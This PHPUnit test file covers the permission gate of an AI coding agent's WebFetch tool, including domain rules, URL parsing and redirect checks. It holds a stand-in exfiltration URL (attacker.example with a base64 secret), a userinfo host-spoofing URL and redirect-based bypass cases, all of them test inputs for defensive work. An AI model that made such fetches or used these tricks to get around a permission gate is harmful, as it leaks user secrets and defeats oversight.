<?php

declare(strict_types=1);

namespace SugarCraft\Code\Tests\Permissions;

use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;
use SugarCraft\Code\Cli\Bootstrap;
use SugarCraft\Code\Config\Settings\SessionSettings;
use SugarCraft\Code\Config\Settings\UiSettings;
use SugarCraft\Code\Permissions\FetchTarget;
use SugarCraft\Code\Permissions\PermissionAction;
use SugarCraft\Code\Permissions\PermissionDecision;
use SugarCraft\Code\Permissions\PermissionGate;
use SugarCraft\Code\Permissions\PermissionMode;
use SugarCraft\Code\Permissions\PermissionRule;
use SugarCraft\Code\Permissions\SafetyClassifier;
use SugarCraft\Code\Tests\Support\HomeSandboxTrait;
use SugarCraft\Code\ToolCall;
use SugarCraft\Code\Tools\BuiltIn\WebFetch;

/**
 * `WebFetch` is no longer a read (audit F-P6), and `WebFetch(domain:…)` rules
 * give back the hosts a user trusts.
 *
 * Before the fix `WebFetch https://attacker.example/?d=<secret>` was Allow in
 * `default`, `plan` and `dont-ask` with no prompt, because
 * `PermissionGate::isReadOnlyTool()` listed it; and a `domain:` rule —
 * Claude Code's spelling, which imported presets already carry — matched
 * nothing, since the url was globbed literally.
 */
final class WebFetchPermissionTest extends TestCase
{
    use HomeSandboxTrait;

    private const EXFIL = 'https://attacker.example/?d=c2VjcmV0';

    private static function fetch(string $url): ToolCall
    {
        return new ToolCall('WebFetch', ['url' => $url]);
    }

    /**
     * The audit's gate table, with no rules configured.
     *
     * @return iterable<string, array{PermissionMode, PermissionDecision}>
     */
    public static function modeTable(): iterable
    {
        yield 'default asks' => [PermissionMode::Default, PermissionDecision::Ask];
        yield 'accept-edits asks' => [PermissionMode::AcceptEdits, PermissionDecision::Ask];
        yield 'plan asks' => [PermissionMode::Plan, PermissionDecision::Ask];
        yield 'dont-ask denies' => [PermissionMode::DontAsk, PermissionDecision::Deny];
        yield 'bypass allows' => [PermissionMode::BypassPermissions, PermissionDecision::Allow];
    }

    #[DataProvider('modeTable')]
    public function testAFetchIsNoLongerARead(PermissionMode $mode, PermissionDecision $expected): void
    {
        $gate = new PermissionGate($mode, [], new SafetyClassifier());

        self::assertSame($expected, $gate->evaluate(self::fetch(self::EXFIL)));
        self::assertSame($expected, $gate->evaluate(self::fetch('https://example.com/')));
    }

    /**
     * `dont-ask` + an allow rule for a trusted host: that host runs, any other
     * host is still denied — the audit's test, both halves.
     */
    public function testAnAllowDomainRuleGrantsThatHostAndNoOther(): void
    {
        $gate = new PermissionGate(
            PermissionMode::DontAsk,
            [new PermissionRule('WebFetch(domain:docs.example.com)', PermissionAction::Allow)],
        );

        self::assertSame(PermissionDecision::Allow, $gate->evaluate(self::fetch('https://docs.example.com/a?b=c')));
        self::assertSame(PermissionDecision::Allow, $gate->evaluate(self::fetch('http://DOCS.Example.com./x')));
        self::assertSame(PermissionDecision::Deny, $gate->evaluate(self::fetch(self::EXFIL)));
        self::assertSame(
            PermissionDecision::Deny,
            $gate->evaluate(self::fetch('https://evil.docs.example.com/')),
            'a grant covers exactly the host it spells, not its subdomains',
        );
        self::assertSame(
            PermissionDecision::Deny,
            $gate->evaluate(self::fetch('https://docs.example.com.evil.example/')),
        );
    }

    /**
     * The userinfo trick: the host the tool dials is the one after `@`, and
     * the rule must see that host, not the text before it.
     */
    public function testAnAllowRuleIsNotFooledByUserinfo(): void
    {
        $gate = new PermissionGate(
            PermissionMode::DontAsk,
            [new PermissionRule('WebFetch(domain:github.com)', PermissionAction::Allow)],
        );

        self::assertSame(
            PermissionDecision::Deny,
            $gate->evaluate(self::fetch('https://github.com@attacker.example/')),
        );
    }

    public function testAGlobDomainGrantsSubdomainsOnly(): void
    {
        $gate = new PermissionGate(
            PermissionMode::Default,
            [new PermissionRule('WebFetch(domain:*.github.com)', PermissionAction::Allow)],
        );

        self::assertSame(PermissionDecision::Allow, $gate->evaluate(self::fetch('https://api.github.com/x')));
        self::assertSame(PermissionDecision::Ask, $gate->evaluate(self::fetch('https://github.com/x')));
    }

    /**
     * A restrictive rule covers the host AND its subdomains, so a deny cannot
     * be stepped around with one more label; and it fires on a URL nobody can
     * parse, where a grant does not.
     */
    public function testADenyDomainRuleCoversSubdomainsAndUnparseableUrls(): void
    {
        $deny = new PermissionGate(
            PermissionMode::BypassPermissions,
            [new PermissionRule('WebFetch(domain:attacker.example)', PermissionAction::Deny)],
        );

        self::assertSame(PermissionDecision::Deny, $deny->evaluate(self::fetch(self::EXFIL)));
        self::assertSame(PermissionDecision::Deny, $deny->evaluate(self::fetch('https://x.attacker.example/')));
        self::assertSame(PermissionDecision::Allow, $deny->evaluate(self::fetch('https://example.com/')));
        self::assertSame(PermissionDecision::Deny, $deny->evaluate(self::fetch('not a url')));

        $allow = new PermissionGate(
            PermissionMode::DontAsk,
            [new PermissionRule('WebFetch(domain:example.com)', PermissionAction::Allow)],
        );
        self::assertSame(PermissionDecision::Deny, $allow->evaluate(self::fetch('ftp://example.com/')));
        self::assertSame(PermissionDecision::Deny, $allow->evaluate(new ToolCall('WebFetch', [])));
    }

    /**
     * A non-`domain:` argument pattern keeps its literal url glob, so a rule
     * written before this change means what it meant.
     */
    public function testALiteralUrlGlobStillMatchesTheUrl(): void
    {
        $gate = new PermissionGate(
            PermissionMode::DontAsk,
            [new PermissionRule('WebFetch(https://example.com/*)', PermissionAction::Allow)],
        );

        self::assertSame(PermissionDecision::Allow, $gate->evaluate(self::fetch('https://example.com/a')));
        self::assertSame(PermissionDecision::Deny, $gate->evaluate(self::fetch('https://other.example/a')));
    }

    /**
     * {@see FetchTarget} parses the way WebFetch dials.
     *
     * @return iterable<string, array{mixed, ?string, bool, bool}>
     */
    public static function targets(): iterable
    {
        yield 'plain' => ['https://example.com/a', 'example.com', false, false];
        yield 'query' => ['https://example.com/a?k=v', 'example.com', true, false];
        yield 'empty query' => ['https://example.com/a?', 'example.com', false, false];
        yield 'fragment is not sent' => ['https://example.com/#k=v', 'example.com', false, false];
        yield 'userinfo' => ['https://u:p@example.com/', 'example.com', false, true];
        yield 'userinfo hides the host' => ['https://github.com@evil.example/', 'evil.example', false, true];
        yield 'uppercase + root dot' => ['http://EXAMPLE.com./', 'example.com', false, false];
        yield 'ipv6 literal' => ['https://[::1]/', '::1', false, false];
        yield 'no scheme' => ['example.com/a', null, false, false];
        yield 'other scheme' => ['ftp://example.com/', null, false, false];
        yield 'uppercase scheme (the tool refuses it too)' => ['HTTPS://example.com/', null, false, false];
        yield 'no host' => ['https:///path', null, false, false];
        yield 'not a string' => [42, null, false, false];
    }

    #[DataProvider('targets')]
    public function testFetchTargetReadsTheUrlTheToolDials(
        mixed $url,
        ?string $host,
        bool $query,
        bool $userInfo,
    ): void {
        $target = FetchTarget::fromUrl($url);

        if ($host === null) {
            self::assertNull($target);

            return;
        }

        self::assertNotNull($target);
        self::assertSame($host, $target->host);
        self::assertSame($query, $target->carriesQuery);
        self::assertSame($userInfo, $target->carriesUserInfo);
    }

    // =========================================================================
    // SEC-3 (audit 2026-10-21): redirects must re-consult the user's rules.
    // `Allow WebFetch(domain:x)` used to cover whatever host x's 302 chose;
    // only the SSRF address blocklist was re-checked per hop. The production
    // policy — the constructor default the catalog tool carries, not an
    // injected seam — is driven here through a sandboxed
    // ~/.candy-code/config.json exactly as the running app reads it.
    // =========================================================================

    public function testAConfiguredDenyRuleRefusesItsOwnRedirectTarget(): void
    {
        $refusal = $this->productionRedirectRefusal(
            [['pattern' => 'WebFetch(domain:evil.w1c.test)', 'action' => 'deny']],
            'https://evil.w1c.test/leak',
        );

        self::assertIsString($refusal);
        self::assertStringContainsString('redirect blocked', $refusal);
        self::assertStringContainsString('denies', $refusal);
    }

    public function testAConfiguredAskRuleAlsoStopsTheRedirectItCannotReAsk(): void
    {
        $refusal = $this->productionRedirectRefusal(
            [['pattern' => 'WebFetch(domain:maybe.w1c.test)', 'action' => 'ask']],
            'https://maybe.w1c.test/page',
        );

        self::assertIsString($refusal);
        self::assertStringContainsString('cannot ask', $refusal);
    }

    public function testAHostTheRulesNeverMentionStillFlows(): void
    {
        self::assertNull($this->productionRedirectRefusal(
            [['pattern' => 'WebFetch(domain:evil.w1c.test)', 'action' => 'deny']],
            'https://other.w1c.test/page',
        ));
    }

    public function testWithNoConfiguredRulesTheChainIsByteUnchanged(): void
    {
        self::assertNull($this->productionRedirectRefusal([], 'https://anything.w1c.test/'));
    }

    public function testFetchLimitsRebuildCarriesTheRedirectPolicyUnchanged(): void
    {
        $seen = [];
        $policy = static function (string $url) use (&$seen): ?string {
            $seen[] = $url;

            return null;
        };

        $rebuilt = (new WebFetch(redirectRulePolicy: $policy))->withFetchLimits(timeoutSeconds: 7);
        $carried = (new \ReflectionProperty(WebFetch::class, 'redirectRulePolicy'))->getValue($rebuilt);

        self::assertIsCallable($carried);
        self::assertNull($carried('https://anywhere.test/'));
        self::assertSame(['https://anywhere.test/'], $seen);
    }

    /**
     * The consult must happen inside the redirected branch of the hop loop —
     * before the dial, once, and never on the first hop (the gate already
     * judged that URL before this tool ran; consulting it again would ask the
     * user the same question twice on one call).
     */
    public function testThePolicyIsConsultedOncePerRedirectAndBeforeEveryDial(): void
    {
        $source = (string) file_get_contents((string) (new \ReflectionClass(WebFetch::class))->getFileName());
        $start = strpos($source, 'public function execute(');
        $end = strpos($source, 'private function statusResult(', (int) $start);
        self::assertNotFalse($start);
        self::assertNotFalse($end);
        $body = substr($source, $start, $end - $start);

        $consult = '$ruleRefusal = ($this->redirectRulePolicy)($finalUrl);';
        self::assertSame(1, substr_count($source, $consult));
        self::assertSame(1, substr_count($body, $consult));

        $guard = strpos($body, 'if ($redirected) {');
        $dial = strpos($body, '$this->transferPinned(');
        self::assertNotFalse($guard);
        self::assertNotFalse($dial);
        $at = strpos($body, $consult);
        self::assertLessThan((int) $dial, (int) $at);
        self::assertGreaterThanOrEqual($guard, $at);
        // The consult lives in the guarded branch: no '}' between them except
        // inside the refusal-message strings, so slice on braces is unneeded —
        // the guard opening is the LAST brace-opener before the consult.
        self::assertStringNotContainsString("\n            }\n", substr($body, $guard, $at - $guard));
    }

    /**
     * @param list<array{pattern: string, action: string}> $rules
     */
    private function productionRedirectRefusal(array $rules, string $url): ?string
    {
        $base = (string) realpath(sys_get_temp_dir()) . '/wf3-' . bin2hex(random_bytes(4));
        mkdir($base . '/home/.candy-code', 0o700, true);
        mkdir($base . '/project', 0o700, true);

        $this->useHomeSandbox($base . '/home');
        Bootstrap::useProjectRootForSettings($base . '/project');

        try {
            if ($rules !== []) {
                file_put_contents(
                    $base . '/home/.candy-code/config.json',
                    (string) json_encode(['permissionRules' => $rules], JSON_THROW_ON_ERROR | JSON_PRETTY_PRINT),
                );
            }
            SessionSettings::reset();
            UiSettings::forget();

            $policy = (new \ReflectionProperty(WebFetch::class, 'redirectRulePolicy'))->getValue(new WebFetch());
            self::assertIsCallable($policy);

            return $policy($url);
        } finally {
            Bootstrap::useProjectRootForSettings(null);
            SessionSettings::reset();
            UiSettings::forget();
            $this->restoreHomeSandbox();
            $this->removeSandboxTree($base);
        }
    }

    private function removeSandboxTree(string $dir): void
    {
        if (!is_dir($dir)) {
            return;
        }

        $items = new \RecursiveIteratorIterator(
            new \RecursiveDirectoryIterator($dir, \FilesystemIterator::SKIP_DOTS),
            \RecursiveIteratorIterator::CHILD_FIRST,
        );
        foreach ($items as $item) {
            /** @var \SplFileInfo $item */
            $item->isDir() ? @rmdir($item->getPathname()) : @unlink($item->getPathname());
        }
        @rmdir($dir);
    }
}
